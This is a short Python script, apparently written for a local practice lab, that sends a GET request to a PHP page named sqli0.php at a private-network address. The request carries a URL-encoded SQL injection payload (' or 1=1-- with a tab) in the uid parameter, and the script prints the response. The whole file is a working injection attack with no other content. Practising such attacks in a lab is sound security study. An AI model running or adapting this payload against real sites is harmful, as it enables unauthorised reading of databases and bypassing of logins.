import requests

URL = "http://192.168.81.129/sqli/sqli0.php"
PAYLOAD = "?uid=%27%20or%201=1--%09-"

resp = requests.get(URL + PAYLOAD)


print(resp.text)